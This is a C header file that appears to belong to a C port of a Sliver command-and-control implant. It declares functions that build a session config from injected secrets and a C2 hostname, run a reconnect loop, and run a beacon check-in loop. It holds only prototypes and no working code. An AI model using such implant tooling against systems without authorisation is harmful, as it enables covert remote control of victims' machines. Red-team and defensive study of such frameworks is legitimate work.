/* sliver/implant.h - shared entry point for exe and DLL artifacts. */
#ifndef SLIVER_IMPLANT_H
#define SLIVER_IMPLANT_H

#include <stddef.h>

#include "sliver/session.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Builds the session config from the injected secrets. host_buf receives the C2
 * hostname and cfg.host points at it; keep host_buf alive for cfg's lifetime. */
int sliver_session_config_build(sliver_session_config_t *cfg, char *host_buf,
                                size_t host_cap, const char *argv0);

/* Runs the interactive session reconnect loop. argv0 is the process image name
 * reported in the register message (may be NULL for a loaded DLL). */
int sliver_implant_run(const char *argv0);

/* Runs the beacon register/checkin loop (sleep/jitter). argv0 as above. */
int sliver_beacon_run(const char *argv0);

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_IMPLANT_H */
